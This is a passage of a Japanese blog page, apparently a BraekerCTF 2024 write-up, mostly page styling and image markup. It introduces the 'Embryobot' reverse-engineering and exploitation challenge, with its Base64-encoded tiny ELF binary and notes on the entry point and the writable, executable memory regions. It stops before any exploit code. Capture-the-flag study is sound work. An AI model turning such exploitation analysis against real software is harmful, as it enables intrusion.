<!DOCTYPE html><html lang="ja"><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><style data-href="/styles.e71379dda153709d1a9a.css" id="gatsby-global-css">html{font-size:100}body{margin:0 0 0 calc(100vw - 100%);color:#222;line-height:1.4;font-size:.875rem;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;background-color:#fcfcfc}body,h1,h2,h3,h4,h5,h6{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif}h1,h2,h3,h4,h5,h6{font-weight:600}h1{font-size:1.575rem;line-height:2.25rem;margin-top:5rem;margin-bottom:1.25rem}h2{font-size:1.47656rem;line-height:1.875rem}h2,h3{margin-top:2.5rem;margin-bottom:.625rem}h3{font-size:1.20313rem;line-height:1.25rem}h4{font-size:1.05rem;margin-top:1.875rem}h4,h5{line-height:1.25rem;margin-bottom:.625rem}h5,h6{font-size:.875rem;margin-top:3.125rem}h6{line-height:1.25rem;margin-bottom:.625rem}img{max-width:100%;margin:inherit auto}hr,img{border:0;display:block}hr{color:#222;height:1.625rem;margin:3.25rem auto;background-size:100% 26px;background-image:linear-gradient(180deg,transparent 1px,transparent 11px,#222 0,#222 15px,transparent 0,transparent 26px);width:6.25rem}a{color:#918d40;text-decoration:none}a:active,a:focus,a:hover{color:#a9d159}b,strong{font-weight:600}ul{list-style:square;margin-bottom:1.25rem}ul li{padding:0 .3125rem;margin-bottom:.625rem}p{line-height:1.25rem;margin-bottom:1.25rem}blockquote{font-style:italic;text-align:center;background-color:#f5f5f5;padding:.1875rem .625rem}figure{display:block;width:100%;height:auto}figcaption{line-height:.9375rem;margin-top:.3125rem;color:#222;font-size:.75rem;font-style:italic;margin-bottom:0;text-align:center}.anchor{margin-left:-1.875rem!important;padding-right:.875rem!important}@media screen and (min-width:685px){figure.float-left,figure.float-right{max-width:19.375rem;padding:0 1.25rem}.float-right{float:right}.float-left{float:left}}code[class*=language-],pre[class*=language-]{color:#ccc;background:0 0;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:1em;margin:.5em 0;overflow:auto}:not(pre)>code[class*=language-],pre[class*=language-]{background:#2d2d2d}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal}.token.block-comment,.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#999}.token.punctuation{color:#ccc}.token.attr-name,.token.deleted,.token.namespace,.token.tag{color:#e2777a}.token.function-name{color:#6196cc}.token.boolean,.token.function,.token.number{color:#f08d49}.token.class-name,.token.constant,.token.property,.token.symbol{color:#f8c555}.token.atrule,.token.builtin,.token.important,.token.keyword,.token.selector{color:#cc99cd}.token.attr-value,.token.char,.token.regex,.token.string,.token.variable{color:#7ec699}.token.entity,.token.operator,.token.url{color:#67cdcc}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}.token.inserted{color:green}li>code[class*=language-text],p>code[class*=language-text]{background:#f9f9f9!important;color:#2d2d2d!important}.Author-module--author__photo--36xCH{display:inline-block;margin-bottom:0;border-radius:50%;background-clip:padding-box}.Author-module--author__title--2CaTb{font-size:.98438rem;font-weight:600;line-height:1.40625rem;margin:.625rem 0}.Author-module--author__title-link--Yrism,.Author-module--author__title-link--Yrism:focus,.Author-module--author__title-link--Yrism:hover{color:#222}.Author-module--author__subtitle--cAaEB{color:#888;line-height:1.25rem;margin-bottom:1.25rem}.Icon-module--icon--Gpyvw{display:inline-block;width:1em;height:1em;stroke-width:0;stroke:currentColor;fill:currentColor;font-style:normal;font-weight:400;speak:none;margin-right:.2em;text-align:center;font-variant:normal;text-transform:none;line-height:1em;margin-left:.2em;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.Contacts-module--contacts--1rGd1{margin-bottom:1.25rem}.Contacts-module--contacts__list--3OgdW{display:flex;flex-flow:row wrap;flex-grow:0;flex-shrink:0;list-style:none;padding:0;margin:.625rem -.1875rem;width:8.75rem}.Contacts-module--contacts__list-item--16p9q{padding:0;margin:.25rem;display:flex;align-content:center;align-items:center;justify-content:center;height:2.1875rem;width:2.1875rem;line-height:2.1875rem;border-radius:50%;text-align:center;border:1px solid #ebebeb}.Contacts-module--contacts__list-item-link--2MIDn{border:0;display:flex;color:#222}.Contacts-module--contacts__list-item-link--2MIDn:focus,.Contacts-module--contacts__list-item-link--2MIDn:hover{color:#918d40}.Copyright-module--copyright--1ariN{color:#b6b6b6;font-size:.75rem}.Menu-module--menu--Efbin{margin-bottom:1.25rem}.Menu-module--menu__list--31Zeo{list-style:none;padding:0;margin:0}.Menu-module--menu__list-item--1lJ6B{padding:0;margin:.625rem 0}.Menu-module--menu__list-item-link--10Ush{font-size:.875rem;color:#222;font-weight:400;border:0}.Menu-module--menu__list-item-link--10Ush:focus,.Menu-module--menu__list-item-link--10Ush:hover{color:#918d40;border-bottom:1px solid #918d40}.Menu-module--menu__list-item-link--active--2CbUO{color:#222;border-bottom:1px solid #222}.Sidebar-module--sidebar--X4z2p{width:100%}.Sidebar-module--sidebar__inner--Jdc5s{position:relative;padding:1.5625rem 1.25rem 0}.Sidebar-module--headerimage--19Rdy{width:100%;min-height:70px;max-height:120px;margin:0 0 .625rem}.Sidebar-module--logo-image--XDYae{min-height:70px;max-height:120px;margin:0 auto}input{-webkit-appearance:none;-moz-appearance:none;appearance:none;padding:.625rem;margin:.3125rem 0;border:1px solid #999;border-radius:.3125rem}.Sidebar-module--search-container--17C6F{position:relative}.Sidebar-module--search-container-input--27Tw4{width:100%}.Sidebar-module--search-container-submit--WwtLg{position:absolute;width:2.375rem;height:2.375rem;top:calc(50% - 19px);right:0;border:3px solid #999;border-radius:0 .25rem .25rem 0;background:#999}.Sidebar-module--search-container-submit--WwtLg:before{position:absolute;content:"";width:.9375rem;height:.9375rem;top:calc(50% - 9px);left:calc(50% - 9px);border-radius:50%;box-shadow:0 0 0 2px #fff}.Sidebar-module--search-container-submit--WwtLg:after{position:absolute;content:"";width:.5rem;height:.375rem;top:calc(50% + 6px);left:calc(50% + 2px);border-top:2px solid #fff;transform:rotate(45deg)}@media screen and (min-width:685px){.Sidebar-module--sidebar--X4z2p{width:calc(41.625% - 1.09375rem)}.Sidebar-module--sidebar--X4z2p:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Sidebar-module--sidebar--X4z2p:last-child{margin-right:0}.Sidebar-module--sidebar--X4z2p:nth-child(12n){margin-right:0;float:right}.Sidebar-module--sidebar--X4z2p:nth-child(12n+1){clear:both}.Sidebar-module--sidebar__inner--Jdc5s{padding:1.875rem 1.25rem 0}.Sidebar-module--sidebar__inner--Jdc5s:after{background:#e6e6e6;background:linear-gradient(180deg,#e6e6e6 0,#e6e6e6 48%,#fff);position:absolute;content:"";width:.0625rem;height:33.75rem;top:30px;right:-10px;bottom:0}}@media screen and (min-width:960px){.Sidebar-module--sidebar--X4z2p{width:calc(33.3% - 1.25rem)}.Sidebar-module--sidebar--X4z2p:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Sidebar-module--sidebar--X4z2p:last-child{margin-right:0}.Sidebar-module--sidebar--X4z2p:nth-child(3n){margin-right:0;float:right}.Sidebar-module--sidebar--X4z2p:nth-child(3n+1){clear:both}.Sidebar-module--sidebar__inner--Jdc5s{padding:2.5rem}}.Layout-module--layout--3Pyz6{max-width:66.875rem;margin-left:auto;margin-right:auto}.Layout-module--layout--3Pyz6:before{content:"";display:table}.Layout-module--layout--3Pyz6:after{content:"";display:table;clear:both}.Feed-module--feed__item--2D5rE{margin-bottom:1.5625rem}.Feed-module--feed__item--2D5rE:last-child{margin-bottom:.625rem}.Feed-module--feed__item-title--3nigr{font-size:1.47656rem;line-height:1.875rem;margin-top:0;margin-bottom:.625rem}.Feed-module--feed__item-title-link--iFMRs{color:#222}.Feed-module--feed__item-title-link--iFMRs:focus,.Feed-module--feed__item-title-link--iFMRs:hover{color:#222;border-bottom:1px solid #222}.Feed-module--feed__item-description--1uO8e{font-size:.875rem;line-height:1.25rem;margin-bottom:.9375rem}.Feed-module--feed__item-meta-time--3t1fg{font-size:.75rem;color:#222;font-weight:600;text-transform:uppercase}.Feed-module--feed__item-meta-divider--N-Q0A{margin:0 .3125rem}.Feed-module--feed__item-meta-category-link--23f8F{font-size:.75rem;color:#a9d159;font-weight:600;text-transform:uppercase}.Feed-module--feed__item-meta-category-link--23f8F:focus,.Feed-module--feed__item-meta-category-link--23f8F:hover{color:#918d40}.Feed-module--feed__item-readmore--1u6bI{font-size:.875rem;color:#918d40}.Feed-module--feed__item-readmore--1u6bI:focus,.Feed-module--feed__item-readmore--1u6bI:hover{color:#918d40;border-bottom:1px solid #918d40}.Page-module--page--2nMky{margin-bottom:2.5rem}.Page-module--page__inner--2M_vz{padding:1.5625rem 1.25rem}.Page-module--page__title--GPD8L{font-size:1.575rem;font-weight:600;line-height:2.5rem;margin-top:0;margin-bottom:1.8125rem}.Page-module--page__body--Ic6i6{font-size:.875rem;line-height:1.25rem;margin:0 0 1.25rem}@media screen and (min-width:685px){.Page-module--page--2nMky{width:calc(58.275% - .78125rem)}.Page-module--page--2nMky:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Page-module--page--2nMky:last-child{margin-right:0}.Page-module--page--2nMky:nth-child(12n){margin-right:0;float:right}.Page-module--page--2nMky:nth-child(12n+1){clear:both}.Page-module--page__inner--2M_vz{padding:1.875rem 1.25rem}}@media screen and (min-width:960px){.Page-module--page--2nMky{width:calc(66.6% - .625rem)}.Page-module--page--2nMky:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Page-module--page--2nMky:last-child{margin-right:0}.Page-module--page--2nMky:nth-child(3n){margin-right:0;float:right}.Page-module--page--2nMky:nth-child(3n+1){clear:both}.Page-module--page__inner--2M_vz{padding:2.5rem 2.1875rem}}.Pagination-module--pagination--2H3nO{margin-top:2.5rem;display:flex}.Pagination-module--pagination__prev--bet5s{width:50%;text-align:left}.Pagination-module--pagination__prev-link--1Nzs6{color:#a9d159;font-size:1.625rem;font-weight:700}.Pagination-module--pagination__prev-link--1Nzs6:focus,.Pagination-module--pagination__prev-link--1Nzs6:hover{color:#918d40}.Pagination-module--pagination__prev-link--disable--Yklx9{pointer-events:none;color:#bbb}.Pagination-module--pagination__next--3hFiN{width:50%;text-align:right}.Pagination-module--pagination__next-link--3FUtA{color:#a9d159;font-size:1.625rem;font-weight:700}.Pagination-module--pagination__next-link--3FUtA:focus,.Pagination-module--pagination__next-link--3FUtA:hover{color:#918d40}.Pagination-module--pagination__next-link--disable--30UwZ{pointer-events:none;color:#bbb}.Author-module--author--2Yefr{border-top:1px solid #e6e6e6;max-width:43.75rem;padding-top:1.25rem;line-height:1.25rem;margin-top:1.25rem;margin-bottom:2.5rem}.Author-module--author__bio-twitter--n-O9n{display:block;text-decoration:underline}@media screen and (min-width:685px){.Author-module--author--2Yefr{margin-left:auto;margin-right:auto}}.Content-module--content--3p512{max-width:62.8125rem;padding:0 .9375rem;margin:0 auto}.Content-module--content__title--2BDW9{font-size:1.75rem;max-width:43.75rem;font-weight:600;text-align:center;line-height:2.0625rem;margin:1.25rem auto 0}.Content-module--content__body--2TrQ- figure{margin-bottom:1.25rem}.Content-module--content__body--2TrQ- figure blockquote{font-style:italic;text-align:center;margin-top:0;padding:1.25rem 0}.Content-module--content__body--2TrQ- figure blockquote p{max-width:43.75rem;font-size:1.47149rem;margin-top:1.25rem;margin-bottom:1.25rem;line-height:1.875rem}.Content-module--content__body--2TrQ- a{text-decoration:underline}.Content-module--content__body--2TrQ- *{max-width:43.75rem;margin-left:auto;margin-right:auto}.Content-module--content__body--2TrQ- img{max-width:100%;margin-top:.625rem;margin-bottom:.625rem}.Content-module--content__body--2TrQ- li ul{margin-bottom:.625rem}.Content-module--content__body--2TrQ- li p{line-height:1.25rem;margin-bottom:.625rem}.Content-module--content__body--2TrQ- h2{position:relative;padding:1rem 1.5rem;color:#fff;border-radius:.625rem;background:#0c0000}.Content-module--content__body--2TrQ- h2:after{position:absolute;bottom:-9px;left:1rem;width:0;height:0;content:"";border-color:#0c0000 transparent transparent;border-style:solid;border-width:10px 10px 0}.Content-module--content__body--2TrQ- h3{border-bottom:3px dotted #0c0000;padding:1rem 0}@media screen and (min-width:960px){.Content-module--content--3p512{padding:0}.Content-module--content__title--2BDW9{font-size:1.75rem;line-height:2.8125rem;margin-top:2.8125rem;margin-bottom:1.875rem}.Content-module--content__body--2TrQ-,.Content-module--content__body--2TrQ- p{font-size:.98438rem;line-height:1.40625rem;margin-bottom:1.40625rem}.Content-module--content__body--2TrQ- li p{line-height:1.25rem;margin-bottom:.625rem}}.Meta-module--meta__date--29eD7{font-style:italic}.Tags-module--tags--1L_ct{margin-bottom:.625rem}.Tags-module--tags__list--91FqN{list-style:none;margin:0 -.625rem;padding:0}.Tags-module--tags__list-item--1M30P{display:inline-block;margin:.625rem .3125rem}.Tags-module--tags__list-item-link--3SL_8{display:inline-block;height:2.1875rem;padding:0 1.5rem;line-height:2.1875rem;border:1px solid #e6e6e6;text-decoration:none;border-radius:1.25rem;color:#222}.Tags-module--tags__list-item-link--3SL_8:focus,.Tags-module--tags__list-item-link--3SL_8:hover{color:#918d40}.Post-module--post__comments--25y6I,.Post-module--post__footer--3WzWU{max-width:43.75rem;margin:0 auto;padding:0 .9375rem}.Post-module--post__home-button--16Kl0{display:block;max-width:5.625rem;height:2.1875rem;padding:0 1.5rem;line-height:2.1875rem;text-align:center;color:#222;border:1px solid #e6e6e6;border-radius:1.25rem;font-size:.875rem;font-weight:400;margin-left:auto;margin-right:auto;margin-top:1.25rem}.Post-module--post__home-button--16Kl0:focus,.Post-module--post__home-button--16Kl0:hover{color:#918d40}@media screen and (min-width:960px){.Post-module--post__comments--25y6I,.Post-module--post__footer--3WzWU{padding:0}.Post-module--post__home-button--16Kl0{position:fixed;max-width:auto;margin:0;top:30px;left:30px}}</style><meta name="generator" content="Gatsby 2.32.13"/><link rel="alternate" type="application/rss+xml" title="かえるのひみつきち" href="/rss.xml"/><style type="text/css">
    .anchor.before {
      position: absolute;
      top: 0;
      left: 0;
      transform: translateX(-100%);
      padding-right: 4px;
    }
    .anchor.after {
      display: inline-block;
      padding-left: 4px;
    }
    h1 .anchor svg,
    h2 .anchor svg,
    h3 .anchor svg,
    h4 .anchor svg,
    h5 .anchor svg,
    h6 .anchor svg {
      visibility: hidden;
    }
    h1:hover .anchor svg,
    h2:hover .anchor svg,
    h3:hover .anchor svg,
    h4:hover .anchor svg,
    h5:hover .anchor svg,
    h6:hover .anchor svg,
    h1 .anchor:focus svg,
    h2 .anchor:focus svg,
    h3 .anchor:focus svg,
    h4 .anchor:focus svg,
    h5 .anchor:focus svg,
    h6 .anchor:focus svg {
      visibility: visible;
    }
  </style><script>
    document.addEventListener("DOMContentLoaded", function(event) {
      var hash = window.decodeURI(location.hash.replace('#', ''))
      if (hash !== '') {
        var element = document.getElementById(hash)
        if (element) {
          var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop
          var clientTop = document.documentElement.clientTop || document.body.clientTop || 0
          var offset = element.getBoundingClientRect().top + scrollTop - clientTop
          // Wait for the browser to finish rendering before scrolling.
          setTimeout((function() {
            window.scrollTo(0, offset - 0)
          }), 0)
        }
      }
    })
  </script><link rel="preconnect dns-prefetch" href="https://www.google-analytics.com"/><script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-122086587-6"></script><script>
      
      
      if(true) {
        window.dataLayer = window.dataLayer || [];
        function gtag(){window.dataLayer && window.dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-122086587-6', {"send_page_view":false});
      }
      </script><link rel="sitemap" type="application/xml" href="/sitemap.xml"/><link rel="icon" href="/favicon-32x32.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d" type="image/png"/><link rel="manifest" href="/manifest.webmanifest" crossorigin="anonymous"/><meta name="theme-color" content="#F7A046"/><link rel="apple-touch-icon" sizes="48x48" href="/icons/icon-48x48.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="72x72" href="/icons/icon-72x72.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="96x96" href="/icons/icon-96x96.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="144x144" href="/icons/icon-144x144.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="192x192" href="/icons/icon-192x192.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="256x256" href="/icons/icon-256x256.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="384x384" href="/icons/icon-384x384.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="512x512" href="/icons/icon-512x512.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><title data-react-helmet="true">BraekerCTF 2024 Writeup - かえるのひみつきち</title><meta data-react-helmet="true" name="description" content="BraekerCTF 2024 Writeup"/><meta data-react-helmet="true" property="og:site_name" content="BraekerCTF 2024 Writeup - かえるのひみつきち"/><meta data-react-helmet="true" property="og:image" content="https://kashiwaba-yuki.com/static/17b75e0e79b65ff02d61decee9d3f5db/breaker-ctf-2024.png"/><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"/><meta data-react-helmet="true" name="twitter:title" content="BraekerCTF 2024 Writeup - かえるのひみつきち"/><meta data-react-helmet="true" name="twitter:description" content="BraekerCTF 2024 Writeup"/><meta data-react-helmet="true" name="twitter:image" content="https://kashiwaba-yuki.com/static/17b75e0e79b65ff02d61decee9d3f5db/breaker-ctf-2024.png"/><link as="script" rel="preload" href="/webpack-runtime-a3c0f166cb4b802ff58f.js"/><link as="script" rel="preload" href="/framework-3761df4ab6ee9f056936.js"/><link as="script" rel="preload" href="/532a2f07-92db97c0addf07d5cb73.js"/><link as="script" rel="preload" href="/dc6a8720040df98778fe970bf6c000a41750d3ae-cca4015309d56249d0dd.js"/><link as="script" rel="preload" href="/app-a34cb4a57265a0cdacdf.js"/><link as="script" rel="preload" href="/styles-407fe62976dc5310c43e.js"/><link as="script" rel="preload" href="/cd95ea5cbd2c605f26db819f07999610c9ff4310-c2f05dc74373de400085.js"/><link as="script" rel="preload" href="/component---src-templates-post-template-js-381c1b847824134fa4bd.js"/><link as="fetch" rel="preload" href="/page-data/breaker-ctf-2024/page-data.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/251939775.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/401334301.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/825871152.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/app-data.json" crossorigin="anonymous"/></head><body><div id="___gatsby"><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><div class="Layout-module--layout--3Pyz6"><div><a class="Post-module--post__home-button--16Kl0" href="/">All Articles</a><div><div class="Content-module--content--3p512"><h1 class="Content-module--content__title--2BDW9">BraekerCTF 2024 Writeup</h1><div class="Content-module--content__body--2TrQ-"><p>BraekerCTF 2024 に参加しました。Tiny ELF の問題が非常に面白かったので Writeup を書きます。</p>
<!-- omit in toc -->
<h2 id="もくじ" style="position:relative;"><a href="#%E3%82%82%E3%81%8F%E3%81%98" aria-label="もくじ permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>もくじ</h2>
<ul>
<li><a href="#embryobotrevpwn">Embryobot(Rev/Pwn)</a></li>
<li><a href="#binary-shrinkrev">Binary shrink(Rev)</a></li>
<li><a href="#%E3%81%BE%E3%81%A8%E3%82%81">まとめ</a></li>
</ul>
<h2 id="embryobotrevpwn" style="position:relative;"><a href="#embryobotrevpwn" aria-label="embryobotrevpwn permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Embryobot(Rev/Pwn)</h2>
<blockquote>
<p>“This part will be the head, ” the nurse explains. The proud android mother looks at her newborn for the first time. “However, ” the nurse continues, “we noticed a slight growing problem in its code. Don’t worry, we have a standard procedure for this. A human just needs to do a quick hack and it should continue to grow in no time.”</p>
<p>The hospital hired you to perform the procedure. Do you think you can manage?</p>
<p>The embryo is:
f0VMRgEBAbADWTDJshLNgAIAAwABAAAAI4AECCwAAAAAAADo3////zQAIAABAAAAAAAAAACABAgAgAQITAAAAEwAAAAHAAAAABAAAA==</p>
</blockquote>
<p>問題文として与えられた Base64 テキストをデコードすると、非常に小さいサイズの 32 bit ELF バイナリを入手できます。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 793px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/535c85337eb7fc1e0385193aa6add3e4/73fd0/image-20240225142119777.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 15.416666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA2klEQVQI1z2OXUvCYABGd1P0ARIVFBFitlzpmiMbW23v3k1lzdLU5YScW18E0f+/P71XXTwX51wcHi31EtJwhLAFsRUSt2KEMUS2BkTtBHn1QHAxwG9KpPJ3ZxKnLnBOXKbWkNQQjIyQRA/wDq/RfsfvfCcrlrdPvEU5lXyh8Kes7p+pwoyPfk4p5qyDGT+PJZNOxM2uTnDUJTi26W6fY242MDcaWFtNtK+04FMFs17KWsWqOKcQGUtvonhBGS149WfqScjY7CNPHXq1S5y9Nu5+B/fAxN7R//cHpAZlxnGRXdAAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/535c85337eb7fc1e0385193aa6add3e4/8ac56/image-20240225142119777.webp 240w,
/static/535c85337eb7fc1e0385193aa6add3e4/d3be9/image-20240225142119777.webp 480w,
/static/535c85337eb7fc1e0385193aa6add3e4/51ddc/image-20240225142119777.webp 793w"
              sizes="(max-width: 793px) 100vw, 793px"
              type="image/webp"
            />
          <source
            srcset="/static/535c85337eb7fc1e0385193aa6add3e4/8ff5a/image-20240225142119777.png 240w,
/static/535c85337eb7fc1e0385193aa6add3e4/e85cb/image-20240225142119777.png 480w,
/static/535c85337eb7fc1e0385193aa6add3e4/73fd0/image-20240225142119777.png 793w"
            sizes="(max-width: 793px) 100vw, 793px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/535c85337eb7fc1e0385193aa6add3e4/73fd0/image-20240225142119777.png"
            alt="image-20240225142119777"
            title="image-20240225142119777"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>興味深いことに、ヘッダ内で定義されたエントリポイントのアドレスはファイルオフセット上で 0x23 でした。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/bc0c1df53ca36e2ebb692fdd64a0d9a9/d74fe/image-20240225142508200.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 35.833333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABIUlEQVQoz4WQzU6DQBhFWVitNliNxqrRIFClyH+BImBboGCkIm1SNXHj+7/FdWZEd9LFl5lcZg7nDvfmL1HIEYITHfHARnRmsZVmmRDg8dzB7HIMr6/C6d3C2pdhHwz/Ha42c+RSBLMrsQs0tLoyyz6CCrkY4uHUwPTCgX+kkm9SO3BlFXi5T2HuidA6AgNTi1wKsVTnmF95DEQPmw2szZKrjQWoZanM8KxMiY3O4PQna/sJybVP7GjlEezecHvlSktRaRlqI0elZwhJPWNXxKu+wFf6/geMBxbG/N124IrYUcONV7I3S0hFbUdAKkxI5YQB9M4Ns7aa52gbBqSwjVviM16TmgWDUbPJsQb3UCEzgssrbO+RPR33d+WbrP+TfQOYFc9EVOpaPgAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/bc0c1df53ca36e2ebb692fdd64a0d9a9/8ac56/image-20240225142508200.webp 240w,
/static/bc0c1df53ca36e2ebb692fdd64a0d9a9/d3be9/image-20240225142508200.webp 480w,
/static/bc0c1df53ca36e2ebb692fdd64a0d9a9/e46b2/image-20240225142508200.webp 960w,
/static/bc0c1df53ca36e2ebb692fdd64a0d9a9/4b3db/image-20240225142508200.webp 1164w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/bc0c1df53ca36e2ebb692fdd64a0d9a9/8ff5a/image-20240225142508200.png 240w,
/static/bc0c1df53ca36e2ebb692fdd64a0d9a9/e85cb/image-20240225142508200.png 480w,
/static/bc0c1df53ca36e2ebb692fdd64a0d9a9/d9199/image-20240225142508200.png 960w,
/static/bc0c1df53ca36e2ebb692fdd64a0d9a9/d74fe/image-20240225142508200.png 1164w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/bc0c1df53ca36e2ebb692fdd64a0d9a9/d9199/image-20240225142508200.png"
            alt="image-20240225142508200"
            title="image-20240225142508200"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>また、ELF ヘッダを含むすべての領域に書き込みと実行アクセス権限が割り当てられていることがわかります。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/6fcca7e48912a7c3e4ef3a5f3d7e413b/c83ae/image-20240225150808957.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 16.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAuElEQVQI123NyY6CUBCFYTa2w86BbmdB2iHNqOINFxQR0E603fn+r/I3EhM3Lr6cqkpOSknnIeki4rTck81iEi0k0SOiwZagu2aregjV5TD0ifsbjmNRCj8dgraFaJpI1Sb6chEtE+VmpVyXB+7+hb+fhGTkk00EcW+F7FisGgb2h4ZZmWBVtJJd1XFqU9y68fLcld/5vvwoVYdUC8o5n0pyXXKe7ciK2yNzI+RU2HW9omzgNb7f+gc+vlpEg5wXjwAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/6fcca7e48912a7c3e4ef3a5f3d7e413b/8ac56/image-20240225150808957.webp 240w,
/static/6fcca7e48912a7c3e4ef3a5f3d7e413b/d3be9/image-20240225150808957.webp 480w,
/static/6fcca7e48912a7c3e4ef3a5f3d7e413b/e46b2/image-20240225150808957.webp 960w,
/static/6fcca7e48912a7c3e4ef3a5f3d7e413b/2baf0/image-20240225150808957.webp 1180w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/6fcca7e48912a7c3e4ef3a5f3d7e413b/8ff5a/image-20240225150808957.png 240w,
/static/6fcca7e48912a7c3e4ef3a5f3d7e413b/e85cb/image-20240225150808957.png 480w,
/static/6fcca7e48912a7c3e4ef3a5f3d7e413b/d9199/image-20240225150808957.png 960w,
